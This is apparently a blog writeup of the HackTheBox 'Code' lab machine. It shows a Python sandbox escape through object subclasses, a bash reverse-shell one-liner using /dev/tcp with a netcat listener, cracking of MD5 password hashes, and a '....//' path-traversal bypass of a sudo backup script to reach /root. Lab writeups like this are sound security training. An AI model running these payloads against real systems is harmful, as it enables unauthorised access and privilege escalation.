---
title: HackTheBox (Code)
published: 2025-08-05
description: 'My walkthrough in the code machine on the HackTheBox'
image: '/src/content/posts/htb-code/1.jpg'
tags: [htb, web, linux, machines]
category: 'HTB'
draft: false 
lang: 'en'
---

Here iam gonna walkthrough how i solved the **Code** machine. It's a linux machine, an easy one on HackTheBox.

***
# I Reconnaissance

First i started by grabbing the machine IP and paste it on the browser, noticed it didn't give me any response, not even a domain to add it in `/etc/hosts` file.

![Desktop View](/src/content/posts/htb-code/3.png)

Then i decide to run a simple Nmap scan, to see what's going on with the server:

![Desktop View](/src/content/posts/htb-code/4.png)

Noticed there is an SSH server and upnp server is opened and port 5000, by navigating to that port in the browser to see what it has. I relaised it's a simple code editor, an IDE like vscode that can be used to run codes.

![Desktop View](/src/content/posts/htb-code/2.png)

I start analyzing javascript files to search for sensitive data or endpoints. I found some, but they lead to absolutely nothing. Then i start looking for vulns related to this version, found nothing. So i start to play a little bit with the code editor.

***

# II Analyze

Start with a simple code `print(os.name)`, realized that there were restricted words (os, sys, platform, import,....etc) that i don't have access to, indicating some type of WAF exist in place.

![Desktop View](/src/content/posts/htb-code/5.png)

We have nothing now, we need a way to execute arbitrary commands (since this a common thing in HTB, get in the system and read the flag). one way to do that is to find a `class/subclass` that will help to execute commands on the server. To do this we need first to know the subclasses exist in the server or the python environment. There are several ways to do that.

- **1**: You can add an empty tuple `()` appending the `__class__` attribute to it following by the `__bases__` attribute that will return the inherits classes, adding `.__subclasses__()` method at the last thing that will return all the classes inherit from an object (since everything in python is an object). 
```python frame="terminal" title="python"
print((()).__class__.__bases__[0].__subclasses__())
```

- **2**: OR you can do it with empty string (`''`) instead of tuple (`()`):
```python frame="terminal" title="python"
print(''.__class__.__bases__[0].__subclasses__())
```

- **3**: OR use empty list if you want (`[]`). 

But the easiest way is to use the object reference itself (if it's not restricted)
```python frame="terminal" title="python"
print(object.__subclasses__())
```

![Desktop View](/src/content/posts/htb-code/6.png)

***

# III Exploit

As you can see we got bunch of classes, we only focus on ones with **command execution**. There are several ones (`socket.socket`, `os._wrap_close`, `subprocess.Popen`) that may help us to get a **reverse shell**. Let's use `subprocess.Popen`, since it's the easiest way to do it. But the problem is to use this class we need to know it's index. And to know it's index, we don't have a way other than brute forcing it.

![Desktop View](/src/content/posts/htb-code/7.png)

By increase the number from **1** until we find the intended class that we want, we gonna use that number as the intended index in our payload after. 
*You can brute force this easily with burp intruder*. And you will successfully find the index.

# IV Reverse Shell


Now we can use `subprocess.Popen` to execute our reverse shell.

We need first to establish a listener: `nc -lvnp 9001`. Then run this code:

```python frame="terminal" title="python"
print(object.__subclasses__()[317](["bash", "-c", "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1"]))
```

![img-description](/src/content/posts/htb-code/8.png)
_We successfully got a reverse shell_

By executing the `ls` command to list the files on the dir, as you can see we have the source code of our app: `app.py`

![Desktop View](/src/content/posts/htb-code/9.png)

It has the secret key for signing the flask session probably, maybe we could use it to sign an arbitrary session later. I copied the code and paste in my vscode, and found that part of code:
```py frame="terminal" title="python"
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        existing_user = User.query.filter_by(username=username).first()
        if existing_user:
            flash('User already exists. Please choose a different username.')
        else:
            new_user = User(username=username, password=password)
            db.session.add(new_user)
            db.session.commit()
            flash('Registration successful! You can now log in.')
            return redirect(url_for('login'))
```

The passwords from the registration page got md5 hashed in the database, which we may can crack it.
Navigating further, you will find the first flag at the `/app-production` directory:
<figure>
  <img src="/src/content/posts/htb-code/10.png" alt="first flag">
  <figcaption style="text-align: center;"> User Flag </figcaption>
</figure>

But where is second flag? maybe we will find some creds that will help us to get on the SSH server and get it?


By navigating to the `/instacne` directory, i found a database file. We may find the creds here?
![Desktop View](/src/content/posts/htb-code/11.png)

I found a password hash for a user called **martin**. After cracking the hash on [CrackStation.](https://crackstation.net/).
We now have username and password that we can use to login at the SSH server.

***

# V Root

By exec this command in the terminal `ssh martin@10.10.11.62`.
Noticed you successfully logged in, but unfortunately we don't have access to the root directory.

By exec this command: `sudo -l` to see if i have access on sudo or not and what commands i can run, i found the following:
![Desktop View](/src/content/posts/htb-code/12.png)

i have access on a `backy.sh` script. What is that script even doing? I cat the file to read it and found this code:
```bash frame="terminal" title="bash"
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == "$allowed_path"* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```
By reading it's code. it's a bash script that use a json file you provide and then go to a specific route (mentioned in the json file), compress files exists at that route and then put the compressed file in other specific route (mentioned in the json file).

Noticed, there are allowed paths in place `/var/`, `/home/` that you can choose to compress the files. Also in the script, you can see it uses `jq` to parse the json file and filter it from `../` preventing path traversal (But that is actually so easy to bypass)

```bash frame="terminal" title="bash"
allowed_paths=("/var/" "/home/")
updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
```

Fine, but what is that json file looks like? i have no idea.....likely, i found an example file located in my dir, so i read it and it looks like this:
```json frame="terminal" title="json"
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/app-production/app"
	],

	"exclude": [
		".*"
	]
}
```

Likely, we need to change that `directories_to_archive` parameter value to the `/root` directory so the script can gets it's files and compress it. To achieve that, we need path traversal. Since there is a filter for it that filters `../` we can easily bypass that by doubling the sequence `....//` so it will remeve one and leave one.

The json file created will look like the following:
```json frame="terminal" title="json"
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/....//root/"
	],

	"exclude": [
		".*"
	]
}
```
You can then run the script on your file: `sudo /usr/bin/backy.sh testing.json`.

<figure>
  <img src="/src/content/posts/htb-code/13.png" alt="Second Flag">
  <figcaption style="text-align: center;"> Root Flag </figcaption>
</figure>